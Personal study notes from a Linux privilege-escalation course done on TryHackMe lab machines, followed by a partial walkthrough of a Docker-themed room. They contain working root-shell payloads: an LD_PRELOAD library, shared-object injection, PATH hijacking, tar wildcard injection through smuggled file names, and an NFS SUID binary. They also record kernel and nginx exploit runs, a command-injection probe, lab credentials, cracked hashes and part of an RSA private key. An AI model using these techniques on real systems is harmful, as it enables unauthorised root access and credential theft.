```


TCM’s Linux Privileges Escalation for Beginners Notes

Command Line Notes:

ssh TCM@10.10.86.128 
	#Unable to negotiate with 10.10.86.128 port 22: no matching host key type found. Their offer:	ssh-rsa,ssh-dss
	#tryhackme creds: jbugs:Bangerbanger1223!!
	https://tryhackme.com/room/linuxprivescarena
	fix: ssh -oHostKeyAlgorithms=+ssh-dss TCM@10.10.18.89
```

```
==Kernel Enumeration==

Used to start finding Kernel Exploits

TCM@debian:~$ hostname
debian

TCM@debian:~$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux

TCM@debian:~$ cat /proc/version
Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014

TCM@debian:~$ cat /etc/issue
Debian GNU/Linux 6.0 \n \l

TCM@debian:~$ lscpu
Architecture:          x86_64
CPU op-mode(s):        64-bit
CPU(s):                1
Thread(s) per core:    1
Core(s) per socket:    1
CPU socket(s):         1
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 63
Stepping:              2
CPU MHz:               2400.006
Hypervisor vendor:     Xen
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              30720K
TCM@debian:~$ 

TCM@debian:~$ ps aux | head -4 # displays services
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   8396   812 ?        Ss   20:41   0:00 init [2]  
root         2  0.0  0.0      0     0 ?        S    20:41   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    20:41   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    20:41   0:00 [ksoftirqd/0]
```

```
==User Enumeration / Quick Wins & Quick Enumeration==

TCM@debian:~$ whoami
TCM

TCM@debian:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

TCM@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh

TCM@debian:~$ cat /etc/passwd | cut -d : -f 1
root
daemon

TCM@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::

TCM@debian:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:

TCM@debian:~$ history # 1ST THING YOU SHOULD DO ON A BOSS TO SEE WHAT WAS BEING DONE ON THE BOX
    1  ls -al
    2  cat .bash_history 
    3  ls -al
    4  mysql -h somehost.local -uroot -ppassword123

TCM@debian:~$ sudo su -  #Used to test if root is accessible
[sudo] password for TCM: 
Sorry, user TCM is not allowed to execute '/bin/su -' as root on debian.localdomain.
TCM@debian:~$ 
```

```
==NETWORK ENUMERATION==

TCM@debian:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:ea:fe:3f:e2:e5  
          inet addr:10.10.86.128  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::ea:feff:fe3f:e2e5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:2353 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1940 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:154195 (150.5 KiB)  TX bytes:196561 (191.9 KiB)
          Interrupt:20 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:104 errors:0 dropped:0 overruns:0 frame:0
          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:8756 (8.5 KiB)  TX bytes:8756 (8.5 KiB)

TCM@debian:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP qlen 1000
    link/ether 02:ea:fe:3f:e2:e5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.86.128/16 brd 10.10.255.255 scope global eth0
    inet6 fe80::ea:feff:fe3f:e2e5/64 scope link 
       valid_lft forever preferred_lft forever

TCM@debian:~$ route # SHOWS ROUTES , POTENTIALLY COULD SHOW OTHER NETWORKS
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.10.0.0       *               255.255.0.0     U     0      0        0 eth0
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0

TCM@debian:~$ ip route 
10.10.0.0/16 dev eth0  proto kernel  scope link  src 10.10.86.128 
default via 10.10.0.1 dev eth0 

TCM@debian:~$ arp -a #SHOWS WHO THE MACHINE YOU ARE ON IS TALKING TO REGULARLY
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0

TCM@debian:~$ ip neigh
10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa DELAY
TCM@debian:~$ 

TCM@debian:~$ netstat -ano # SHOW OPEN PORTS, SEE IF ANY OTHER MACHINES ARE CONNECTED
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:50413           0.0.0.0:*               LISTEN      off (0.00/0/0)
```

```
==PASSWORD HUNTING==

grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
	# Goes out and looks for anything with PASSWORD= in it, displays in red and spits all of it out into /dev/null

TCM@debian:~$ locate password | more
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 931.7 days)
/boot/grub/password.mod
/boot/grub/password_pbkdf2.mod
/etc/pam.d/common-password
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod

TCM@debian:~$ find / -name authorized_keys
find: `/var/log/apache2': Permission denied

TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
```

```
==Exploring Automated Tools==

LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

	./linpeas.sh
	./linpeas.sh > linpeasresults
	cat linpeasresults | more

LinEnum -
https://github.com/rebootuser/LinEnum

Linux Exploit Suggester 
https://github.com/mzet-/linux-exploit-suggester

	CM@debian:~/tools$ ls
dirtycow  exim  linenum  linpeas  linux-exploit-suggester  nfsshell  nginx  source_files
TCM@debian:~/tools$ cd linux-exploit-suggester/
TCM@debian:~/tools/linux-exploit-suggester$ ls
linux-exploit-suggester.sh
TCM@debian:~/tools/linux-exploit-suggester$ ./linux-exploit-suggester.sh 

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130


Linux Priv Checker - 
https://github.com/sleventyeleven/linuxprivchecker
```

```
== DIRTYCOW PRIVILEGE ESCALATION EXAMPLE==
TCM@debian:~/tools$ ls
dirtycow  exim  linenum  linpeas  linux-exploit-suggester  nfsshell  nginx  source_files
TCM@debian:~/tools$ cd dirtycow
TCM@debian:~/tools/dirtycow$ ls
c0w.c
TCM@debian:~/tools/dirtycow$ gcc -pthread c0w.c -o cow
TCM@debian:~/tools/dirtycow$ ls
c0w.c  cow
TCM@debian:~/tools/dirtycow$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~/tools/dirtycow$ ./cow
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 46522000

madvise 0

ptrace 0

TCM@debian:~/tools/dirtycow$ passwd
root@debian:/home/user/tools/dirtycow# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user/tools/dirtycow# 

==PASSWORDS & FILE PERMISSIONS==

└─$ ls -la /etc/passwd
-rw-r--r-- 1 root root 3145 Jan  3 21:28 /etc/passwd
# displays permisiions of files

gedit 
```

```
==ESCALATION VIA SSH KEYS==

find / -name authorized_keys 2> /dev/null # SERVER'S PUBLIC KEY
find / -name id_rsa 2> /dev/null # OUR PRIVATE KEY

chmod 600 id_rsa # changes the privileges on id_rsa file to allow execution

ssh -i id_rsa user@ip
```

```
==ESCALATION PATH: SUDO==

sudo -l

gtfobins
```

```
==LD_PRELOAD==

sudo -l
# if env+keep+=LD_PRELOAD exists run command below

nano shell.c # in C file input code below and compile

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}

#Compile code

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls
sudo LD_PRELOAD=/PATH/PATH/shell.so <file that was found in sudo -l that can be executed with root>
```

```
==SUID==
ls -la /etc/shadow

find / -perm -u=s -type f 2>/dev/null
#How to look for SUID's on files.
use gtfo bins when find one to priv esc
```

```
==ESCALATION PATH: Other SUID Escalation== Shared Object Injection

find / -type f -perm -0400 -ls 2>/dev/null
find / -type f -perm -0400 -ls 2>/dev/null |grep staff

TCM@debian:~$ ls -la /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so

strace /usr/local/bin/suid-so 2>&1 #debugger to see whats going on in kernel / trying to find a file that we can put malicious code in to have it execute.

strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
ls -la /home/user/.config/libcalc.so
	TCM@debian:~$ ls -la /home/user/.config/libcalc.so
	ls: cannot access /home/user/.config/libcalc.so: No such file or directory
	
nano libcalc.c # making malicious file
	#include <stdio.h>
	#include <stdlib.h>

	static void inject() __attribute__((constructor));
	
	void inject() {
		system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");

mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c # compiling code

/usr/local/bin/suid-so # running suid again to get root.



TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# 
got root.

#summarization - essentially found a suid that had no file/directory but had root privileges, made the file exist with a malicious executable that would execute as root to escalate privileges.
```

```
==Escalation via Binary Symlinks==

 cd linux-exploit-suggester/
./linux-exploit-suggester.sh 
https://www.exploit-db.com/exploits/40768 CVE-2016-1247
	EXPLOIT YOUTUBE WALKTHROUGH
		https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

dpkg -l | grep nginx
find / -type f -perm -0400 -ls 2>/dev/null |grep sudo # finding SUID with staff privilges
	812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
ls -la /var/log/nginx

	sh-4.1$ ./nginxed-root.sh /var/log/nginx/error.log
	 _______________________________
	< Is your server (N)jinxed ? ;o >
	 -------------------------------
			   \ 
				\          __---__
						_-       /--______
				   __--( /     \ )XXXXXXXXXXX\v.  
				 .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
				/XXX(       U     )        XXXXXXX\ 
			  /XXXXX(              )--_  XXXXXXXXXXX\ 
			 /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
			 XXXXX/   /            XXXXXX   \__ \XXXXX
			 XXXXXX__/          XXXXXX         \__---->
	 ---___  XXX__/          XXXXXX      \__         /
	   \-  --__/   ___/\  XXXXXX            /  ___--/=
		\-\    ___/    XXXXXX              '--- XXXXXX
		   \-\/XXX\ XXXXXX                      /XXXXX
			 \XXXXXXXXX   \                    /XXXXX/
			  \XXXXXX      >                 _/XXXXX/
				\XXXXX--__/              __-- XXXX/
				 -XXXXXXXX---------------  XXXXXX-
					\XXXXXXXXXXXXXXXXXXXXXXXXXX/
					  ""VXXXXXXXXXXXXXXXXXXV""
	 
	Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) 
	nginxed-root.sh (ver. 1.0)

	Discovered and coded by: 

	Dawid Golunski 
	https://legalhackers.com 

	[+] Starting the exploit as: 
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

	[+] Compiling the privesc shared library (/tmp/privesclib.c)

	[+] Backdoor/low-priv shell installed at: 
	-rwxr-xr-x 1 www-data www-data 926536 Jan  7 21:56 /tmp/nginxrootsh

	[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: 
	lrwxrwxrwx 1 www-data www-data 18 Jan  7 21:56 /var/log/nginx/error.log -> /etc/ld.so.preload

	[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am.
	

# on new root terminal to reset nginx server:

root@debian:~# invoke-rc.d nginx rotate >/dev/null 2>&1


on nginxed server exploit terminal

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 926536 Jan  7 21:56 /tmp/nginxrootsh

The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! 

nginxrootsh-4.1# 
```

```
==OTHER SUID ESCALATION: ESCALATION VIA ENVIRONMENTAL VARIABLES==

Variables that are available system wide and are inherited by all spawned child processes and shells


env # displays environmental variables.

find / -type f -perm -0400 -ls 2>/dev/null |grep staff

	TCM@debian:~$ find / -type f -perm -0400 -ls 2>/dev/null |grep staff
	816761    4 -rwxr--rw-   1 root     staff          40 May 13  2017 /usr/local/bin/overwrite.sh
	816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
	816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env

strings /usr/local/bin/suid-env
	service apache2 start
	
TCM@debian:~$ print $PATH # looking at path to see where service is located in a director
	Warning: unknown mime-type for "/usr/local/bin:/usr/bin:/bin:/usr/lo
	cal/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin" -- using "appl
	ication/octet-stream"
	Error: no such file "/usr/local/bin:/usr/bin:/bin:/usr/local/games:/
	usr/games:/sbin:/usr/sbin:/usr/local/sbin"

#Going to make c program that is labeled as service, makes it execute to esxcalate us to root and change the environmental variable to make it perform this. c is then placed in /tmp/service.c

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /tmp/service.c
	#didnt work for me

gcc /tmp/service.c -o /tmp/service
	# compiling
	
export PATH=/tmp:$PATH 
	# changing path to allow code to be dound in the path.

/usr/local/bin/suid-env
	#in video teacher is now root.
```

```
==CAPABILITIES OVERVIEW==
Very similar to suid, where certain files are able to execute as root and we are able to take advantage of that to escalate privileges

getcap -r / 2>/dev/null
	
	TCM@debian:~$ getcap -r / 2>/dev/null
	/usr/bin/python2.6 = cap_setuid+ep
	#ep = permit everything

	#since python can be used to run everything on the system, we are going to write a python script to becaome root

/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
	#gives root
```

```	
== SCHEDULES TASKS ==

Cron & Timers Overview

cat /etc/crontab

	# Unlike any other crontab you don't have to run the `crontab'
	# command to install the new version when you edit this file
	# and files in /etc/cron.d. These files also have username fields,
	# that none of the other crontabs do.

	SHELL=/bin/sh
	PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr
	/bin

	# m h dom mon dow usercommand
	17 ** * *root    cd / && run-parts --report /etc/cron.hourly
	25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts
	 --report /etc/cron.daily )
	47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts
	 --report /etc/cron.weekly )
	52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts
	 --report /etc/cron.monthly )
	#
	* * * * * root overwrite.sh # asterics all across the board indicate that it is being ran every 1 min
	* * * * * root /usr/local/bin/compress.sh
	
file might be able to be modified and executed.
```

```
== Escalation Via Cron paths ==

From previous section checking if overwrite.sh is in the first PATH /home/user and because it is not we are injecting a malicious script called "overwrite.sh" to escalate.

ls -la /home/user # does not exist

	TCM@debian:~$ ls -la /home/user
	total 48
	drwxr-xr-x  5 TCM  user 4096 Jun 18  2020 .
	drwxr-xr-x  3 root root 4096 May 15  2017 ..
	-rw-------  1 TCM  user 2527 Jan  8 17:12 .bash_history
	-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
	-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
	drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
	drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
	-rw-------  1 TCM  user  137 May 15  2017 .lesshst
	-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
	-rw-------  1 TCM  user   11 Jun 18  2020 .nano_history
	-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
	drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
	
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh # writing bash shell to overwrite.sh path location
chmod +x /home/user/overwrite.sh # making file executable, and waiting 1 minute for file to execute
ls -la /tmp # to see what time file was last written

	TCM@debian:~$ ls -la /tmp
	total 1108
	drwxrwxrwt  2 root root   4096 Jan  8 18:22 .
	drwxr-xr-x 22 root root   4096 Jun 17  2020 ..
	-rw-r--r--  1 root root 181544 Jan  8 18:22 backup.tar.gz
	-rwsr-sr-x  1 root root 926536 Jan  8 18:22 bash #################################
	-rw-r--r--  1 root root     28 Jan  8 18:21 useless
	TCM@debian:~$ TCM@debian:~$ ls -la /tmp
/tmp/bash -p
	TCM@debian:~$ /tmp/bash -p
	bash-4.1# TCM@debian:~$ /tmp/bash -p
```

```	
== Escalation via Cron Wildcards ==

cat /etc/crontab
		* * * * * root /usr/local/bin/compress.sh # focusing on this portion on this section

cat /usr/local/bin/compress.sh
	TCM@debian:~$ cat /usr/local/bin/compress.sh
	#!/bin/sh
	cd /home/user
	tar czf /tmp/backup.tar.gz * #### because there is a wild card here we can inject and make a script

ls -la /tmp/backup.tar.gz #to look at permisiions
	TCM@debian:~$ ls -la /tmp/backup.tar.gz 
	-rw-r--r-- 1 root root 181544 Jan  8 18:28 /tmp/backup.tar.gz # no execute privileges, going to make script next

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh

ls
	TCM@debian:~$ ls
	myvpn.ovpn  overwrite.sh  runme.sh  tools

chmod +x runme.sh # going to run tar commands next

touch /home/user--checkpoint=1 # when line 560 is backed up, hit the checkpoint once
touch /home/user/--checkpoint-action=exec=sh\runme.sh # and once the checkpoint is hit, run runme.sh
/tmp/bash -p # now we are root
```

```
== Escalation via Cron File Overwrites ==

cat /etc/crontab
	# /etc/crontab: system-wide crontab
	# Unlike any other crontab you don't have to run the `crontab'
	# command to install the new version when you edit this file
	# and files in /etc/cron.d. These files also have username fields,
	# that none of the other crontabs do.

	SHELL=/bin/sh
	PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

	# m h dom mon dow usercommand
	17 ** * *root    cd / && run-parts --report /etc/cron.hourly
	25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/
	cron.daily )
	47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/
	cron.weekly )
	52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/
	cron.monthly )
	#
	* * * * * root overwrite.sh #######
	* * * * * root /usr/local/bin/compress.sh
	
locate overwrite.sh
	/usr/local/bin/overwrite.sh

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh # overwriting file due to it having root privileges as shown on 603 line
ls -la /tmp #to see if bash file updated

/tmp/bash -p # now we are root


/dev/shm If unable to write to /tmp try this.
```

```
==NFS Root Squashing==
( ssh -oHostKeyAlgorithms=+ssh-dss TCM@10.10.18.89 )
GOING TO IDENTIFY ROOT SQUASHING

cat /etc/exports
	/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check) # IF NO ROOT SQUASH IS IDENTIFIED, the /tmp folder is shareable and can be mounted, going to mount /tmp folder
	
#from new attacker machine

showmount -e 10.10.18.89
	└─$ showmount -e 10.10.18.89
	Export list for 10.10.18.89:
	/tmp * # shows that the /tmp folder can indeed be mounted

mkdir /tmp/mountme
mount -o rw,vers=3 10.10.18.89:/tmp /tmp/mountme

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/mountme/x.c # making c script that spits out shell.

# cat /tmp/mountme/x.c # checking all good
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}

gcc /tmp/mountme/x.c -o /tmp/mountme/x # outputting x.c to x and compiling.
	#ignore the warnings.
	└─# gcc /tmp/mountme/x.c -o /tmp/mountme/x
	/tmp/mountme/x.c: In function ‘main’:
	/tmp/mountme/x.c:1:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
		1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}
		  |              ^~~~~~
	/tmp/mountme/x.c:1:25: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
		1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}
		  |                         ^~~~~~
	/tmp/mountme/x.c:1:36: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
		1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}

chmod +s /tmp/mountme/x # adding suid bit.

	┌──(root㉿kali)-[/tmp/mountme]
	└─# chmod +s /tmp/mountme/x

back on TCM box.

cd /tmp
./x 

should have gotten root, i didnt because GLIB_2.34 doesn't exist on tcm box.. Tried to download glib to run file, didnt work.
```

```
==DOCKER==
  https://tryhackme.com/room/ultratech1

IP:
ping
nmap -sC -sV -oA nmap 10.10.187.107

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-09 19:40 EST
Nmap scan report for 10.10.187.107
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


2:59 PM 1/9/2023

 gobuster dir -e  -u http://10.10.187.107:8081 -w /usr/share/wordlists/dirb/common.txt > /home/kali/Documents/tryhackme/ultratech1/gobuster_results_common.txt

	===============================================================
	Gobuster v3.4
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.187.107:8081
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.4
	[+] Expanded:                true
	[+] Timeout:                 10s
	===============================================================
	2023/01/09 19:58:26 Starting gobuster in directory enumeration mode
	===============================================================
	http://10.10.187.107:8081/auth                 (Status: 200) [Size: 39]
	http://10.10.187.107:8081/ping                 (Status: 500) [Size: 1094]


3:16 PM 1/9/2023 Looking for more directories:

dirsearch -u http://10.10.187.107:8081 -x 400,401,403 > dirsearch_10.10.187.107_port_8081.txt

#nothing new here

3:22 PM 1/9/2023 rescanned for all ports - found a new webserver.

nmap -sC -sV -p- 10.10.187.107   

31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

#going to try going here
http://10.10.187.107:31331/partners.html
#login screen found from robots.txt.
Going to try dirsearching this new port/ip combo to see what else is found.

dirsearch -u http://10.10.187.107:31331 -x 400,401,403 > dirsearch_10.10.187.107_port_31331.txt

	Target: http://10.10.187.107:31331/

	[21:08:19] Starting: 
	[21:08:22] 301 -  320B  - /js  ->  http://10.10.187.107:31331/js/
	[21:09:03] 301 -  321B  - /css  ->  http://10.10.187.107:31331/css/
	[21:09:08] 200 -   15KB - /favicon.ico
	[21:09:11] 301 -  324B  - /images  ->  http://10.10.187.107:31331/images/
	[21:09:11] 200 -    4KB - /images/
	[21:09:12] 200 -    6KB - /index.html
	[21:09:13] 301 -  328B  - /javascript  ->  http://10.10.187.107:31331/javascript/
	[21:09:14] 200 -    1KB - /js/
	[21:09:28] 200 -   53B  - /robots.txt

	#Did not get any results with my search. going to try differest dirb command.
	
4:10 PM 1/9/2023
gobuster dir -u http://10.10.187.107:31331/ -w /usr/share/wordlists/dirb/common.txt -t 64


http://10.10.187.107:8081/ping?ip=`cat utech.db.sqlite`


5:25 PM 1/9/2023
#MOST OF WORK DONE IN CHERRYTREE ON NIX BOX.

creds:
admin:0d0ea5111e3c1def594c1684e3b9be84
r00t:f357a0c52799563c7c7b76c1e7543a32

admin:mrsheafy
r00t:n100906
                      

5:27 PM 1/9/2023
on with r00t creds. in as r00t, 1001 id, this is not actually root. going to look around.


5:38 PM 1/9/2023
commands to look at docker logs

which docker
docker ps -a0
docker logs unruffled_shockley

	----END RSA PRIVATE KEY-----
	bash-5.0# cat /hostOS/root/.ssh/id_rsa
	-----BEGIN RSA PRIVATE KEY-----
	MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
	sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
	jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
	NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
	hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
	jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
	tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
	YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
	wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
	BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
	5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
	o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
	tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
	eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
	/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
	t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
	lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
	4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
	96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
	kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
	v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
